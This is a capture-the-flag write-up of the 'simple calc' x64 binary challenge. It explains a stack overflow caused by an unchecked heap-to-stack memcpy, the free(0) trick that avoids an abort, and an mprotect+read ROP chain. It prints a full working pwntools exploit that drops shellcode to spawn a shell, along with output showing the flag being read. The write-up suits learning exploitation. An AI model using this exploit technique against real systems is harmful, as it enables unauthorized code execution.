### Solved by Swappage and superkojiman

simple calc is an x64 ELF Binary exploitation challenge, the objective was to pop a shell and read the flag.

The application starts by printing a welcome message and asking us how many calculations we are planning to do with the program.



    0x004013d5    e899ffffff   call sym.print_motd
       0x00401373() ; sym.print_motd
    0x004013da    bfd0434900   mov edi, str.Expectednumberofcalculations
    0x004013df    b800000000   mov eax, 0x0
    0x004013e4    e8a76f0000   call sym._IO_printf
       0x00408390() ; sym.__printf
    0x004013e9    488d45ec     lea rax, [rbp-0x14]
    0x004013ed    4889c6       mov rsi, rax
    0x004013f0    bf14424900   mov edi, 0x494214
    0x004013f5    b800000000   mov eax, 0x0
    0x004013fa    e8c1700000   call sym.__isoc99_scanf


      |#------------------------------------#|
      |         Something Calculator         |
      |#------------------------------------#|

      Expected number of calculations:

and after a couple of checks, it allocates a number of words equal to the amount of iterations we are planning to make

    |    0x00401425    b800000000   mov eax, 0x0
    |    0x0040142a    e959010000   jmp 0x401588
    `--> 0x0040142f    8b45ec       mov eax, [rbp-0x14]
         0x00401432    c1e002       shl eax, 0x2
         0x00401435    4898         cdqe
         0x00401437    4889c7       mov rdi, rax
         0x0040143a    e8113c0100   call sym.__libc_malloc

at this point the applications asks what operation we want to make

    Options Menu:
     [1] Addition.
     [2] Subtraction.
     [3] Multiplication.
     [4] Division.
     [5] Save and Exit.
    =>

and based on the operation we chose, it asks for two numbers and performs the operation on them, providing the result to the user and storing it on the heap area that was previously allocated using **malloc()**

chosing the option 5 is where magic happens, because we enter in abranch of code that does the following:

    0x0040152e    8b45ec       mov eax, [rbp-0x14]
    0x00401531    c1e002       shl eax, 0x2
    0x00401534    4863d0       movsxd rdx, eax
    0x00401537    488b4df0     mov rcx, [rbp-0x10]
    0x0040153b    488d45c0     lea rax, [rbp-0x40]
    0x0040153f    4889ce       mov rsi, rcx
    0x00401542    4889c7       mov rdi, rax
    0x00401545    e886130200   call sym.memcpy
    0x004228d0() ; sym.memcpy
    0x0040154a    488b45f0     mov rax, [rbp-0x10]
    0x0040154e    4889c7       mov rdi, rax
    0x00401551    e87a410100   call sym.free
    0x004156d0() ; sym.__cfree
    0x00401556    b800000000   mov eax, 0x0
    0x0040155b    eb2b         jmp 0x401588

Essentially what happens here is that

- the area of memory allocated in the heap is copied on the stack using **memcpy()**
- then free() is called
- finally the main() function returns.

But since there is no boundary check, if we allocate a big enough chunk of memory on the heap, when memcpy() is invoked what happens is that the stack is smashed badly; plus with the fact that by doing arbitrary math operations we can chose what goes on the heap, this means we can overwrite saved registers values on the stack with arbitrary addresses, resulting in a control of the instruction pointer.

As we can see in the following memory dumps of the heap and stack

    gdb-peda$ x/32wx 0x725bd0
    0x725bd0:	0x41414141	0x41414142	0x41414143	0x41414144
    0x725be0:	0x41414145	0x41414146	0x41414147	0x41414148
    0x725bf0:	0x41414149	0x4141414a	0x4141414b	0x4141414c
    0x725c00:	0x4141414d	0x00000000	0x00000000	0x00000000
    0x725c10:	0x00000000	0x00000000	0x00000000	0x00000000
    0x725c20:	0x00000000	0x00000000	0x00000000	0x00000000
    0x725c30:	0x00000000	0x00000000	0x00000000	0x00000000
    0x725c40:	0x00000000	0x00000000	0x00000000	0x00000000

    0x7ffe47681940:	0x00000001	0x00000000	0x00000001	0x00000000
    0x7ffe47681950:	0x47681a68	0x00007ffe	0x00401c77	0x00000000
    0x7ffe47681960:	0x004002b0	0x00000000	0x00000005	0x000000be
    0x7ffe47681970:	0x00bcabd0	0x00000000	0x00401c00	0x0000005a
    0x7ffe47681980:	0x006c1018	0x00000000	0x0040176c	0x00000000
    0x7ffe47681990:	0x00000000	0x00000000	0x00000000	0x00000001
    0x7ffe476819a0:	0x47681a68	0x00007ffe	0x00401383	0x00000000
    0x7ffe476819b0:	0x004002b0	0x00000000	0x0aa3d5f9	0xf71192f8

when memcpy() is called our pointers are going to be overwritten

    => 0x401545 <main+450>:	call   0x4228d0 <memcpy>
       0x40154a <main+455>:	mov    rax,QWORD PTR [rbp-0x10]
       0x40154e <main+459>:	mov    rdi,rax
       0x401551 <main+462>:	call   0x4156d0 <free>
       0x401556 <main+467>:	mov    eax,0x0
    Guessed arguments:
    arg[0]: 0x7ffe47681940 --> 0x1
    arg[1]: 0xbcabd0 ("AA...")
    arg[2]: 0x2f8
    arg[3]: 0xbcabd0 ("AAAA..."...)

the only problem that remains to overcome is the fact that these set of instructions is called before the main function returns

    0x40154a <main+455>:	mov    rax,QWORD PTR [rbp-0x10]
    0x40154e <main+459>:	mov    rdi,rax
    0x401551 <main+462>:	call   0x4156d0 <free>

if we don't have a proper buffer, free() would receive an invalid address and throw an ABORT signal causing our exploitation process to fail.

This can be easily circumvented by manipulating the buffer in such a way that 0 is passed as an argument to free()

In fact free() can accept 0 as arguments, and this simply means the function does nothing. (nice find from superkojiman)

at this point main will return into our buffer and we are in control of RIP.

From here on what remains to do is to build a ROP chain that would spawn a shell.

superkojiman set up a mprotect() + read() ROP chain using the statically linked functions and after some troubles caused by buffer alignment issues he managed to smoothly pop a shell on the system to read the flag

The following is our final exploit.

```python
#!/usr/bin/env python

from pwn import *

context(arch="amd64", os="linux")

def add_align():
    # align address
    r.send("2\n")
    print r.recv()
    r.send("12345678\n")
    print r.recv()
    r.send("12345678\n")
    print r.recv()


#r = remote("localhost", 2323)
r = remote("simplecalc.bostonkey.party", 5400)

print r.recv()
r.send("190\n")
print r.recv()


#x + y = 1094795585 == 0x41414141
x = 85
y = 1094795500

# subtract so when free is called, we get free(0) which is valid
for a in range(0, 14):
    r.send("2\n")
    print r.recv()
    r.send("12345678\n")
    print r.recv()
    r.send("12345678\n")
    print r.recv()

# padding to get to RIP
for a in range(0, 4):
    r.send("1\n")
    print r.recv()
    r.send(str(x)+"\n")
    print r.recv()
    r.send("1094795500\n")
    print r.recv()
    x = x + 1

"""
ROP gadgets
0x0000000000474c6a: pop rax; ret;
0x0000000000493fef: pop rdi; ret;
0x00000000004ac9b8: pop rsi; ret;
0x0000000000437a85: pop rdx; ret;
0x0000000000437aa9: pop rdx; pop rsi; ret;
0x0000000000467f95: syscall; ret;
"""


# RIP overwrite here

#__[start mprotect ROP chain]__#
r.send("1\n")
print r.recv()
r.send("12345\n")
print r.recv()
#r.send("1094795500\n")
r.send("4788150\n")         # 12345 + 4788150 = 0x493fef ; pop rdi; ret
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("85\n")
print r.recv()
r.send("7077803\n")         # 85 + 7077803 = 0x6c0000 ; addr to mprotect rwx
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("12345\n")
print r.recv()
r.send("4409968\n")         # 12345 + 4409968 = 0x437aa9 ; pop rdx; pop rsi; ret
print r.recv()

add_align()

r.send("2\n")
print r.recv()
r.send("12352\n")
print r.recv()
r.send("12345\n")         # 12352 - 12345 = 7 ; rwx
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("85\n")
print r.recv()
r.send("12203\n")         # 85 + 12203 = 0x3000 ; len to mprotect
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("12345\n")
print r.recv()
r.send("4660273\n")         # 12345 + 4660273 = 0x474c6a ; pop rax; pop rsi; ret
print r.recv()

add_align()

r.send("2\n")
print r.recv()
r.send("12345\n")
print r.recv()
r.send("12335\n")         # 12345 - 12335 = 10 ; sys_mprotect
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("12345\n")
print r.recv()
r.send("4607836\n")         # 12345 + 4607836 = 0x467f95: syscall; ret;
print r.recv()
#__[end mprotect ROP chain]__#



#__[start read ROP chain]__#
add_align()

r.send("1\n")
print r.recv()
r.send("12345\n")
print r.recv()
#r.send("1094795500\n")
r.send("4788150\n")         # 12345 + 4788150 = 0x493fef ; pop rdi; ret
print r.recv()

add_align()
add_align()                 # reuse this to set rdi (stdin) = 0
add_align()

r.send("1\n")
print r.recv()
r.send("12345\n")
print r.recv()
r.send("4409968\n")         # 12345 + 4409968 = 0x437aa9 ; pop rdx; pop rsi; ret
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("85\n")
print r.recv()
r.send("12203\n")         # 85 + 12203 = 0x3000 ; len to read
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("85\n")
print r.recv()
r.send("7077803\n")         # 85 + 7077803 = 0x6c0000 ; addr to store data to
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("12345\n")
print r.recv()
r.send("4607836\n")         # 12345 + 4607836 = 0x467f95: syscall; ret;
print r.recv()

add_align()

r.send("1\n")
print r.recv()
r.send("85\n")
print r.recv()
r.send("7077803\n")         # 85 + 7077803 = 0x6c0000 ; return to payload
print r.recv()

#__[end read ROP chain]__#


r.send("5\n");

print "Press ENTER to send shellcode"
raw_input()
r.send(asm(shellcraft.linux.sh() + "\n"))

r.interactive()

```

and here we see it in action.


    # ./sploit.py
    [+] Opening connection to simplecalc.bostonkey.party on port 5400: Done

        |#------------------------------------#|
        |         Something Calculator         |
        |#------------------------------------#|


    Expected number of calculations:
    Options Menu:
     [1] Addition.
     [2] Subtraction.
     [3] Multiplication.
     [4] Division.
     [5] Save and Exit.
    =>
    Integer x:
    Integer y:
    Result for x - y is 0.
    .
    .
    .
    [*] Switching to interactive mode
    Integer y: Result for x + y is 7077888.

    Options Menu:
     [1] Addition.
     [2] Subtraction.
     [3] Multiplication.
     [4] Division.
     [5] Save and Exit.
    => $ id
    uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
    $ ls -la
    total 2052
    drwxr-xr-x 2 calc calc   4096 Mar  5 03:24 .
    drwxr-xr-x 3 root root   4096 Mar  4 05:04 ..
    -rw-r--r-- 1 calc calc    220 Mar  4 05:04 .bash_logout
    -rw-r--r-- 1 calc calc   3637 Mar  4 05:04 .bashrc
    -rw-r--r-- 1 calc calc    675 Mar  4 05:04 .profile
    -rw-r--r-- 1 root root     32 Mar  4 05:23 key
    -rwxr-xr-x 1 root root     80 Mar  5 03:24 run.sh
    -rwxrwxr-x 1 calc calc 882266 Mar  5 03:24 simpleCalc
    -rwxrwxr-x 1 calc calc 882266 Mar  5 03:23 simpleCalc_v2
    -rw-r--r-- 1 root root 302348 Feb  1  2014 socat_1.7.2.3-1_amd64.deb
    $ cat key
    BKPCTF{what_is_2015_minus_7547}
    [*] Got EOF while reading in interactive
    ###


the flag is **BKPCTF{what_is_2015_minus_7547}**
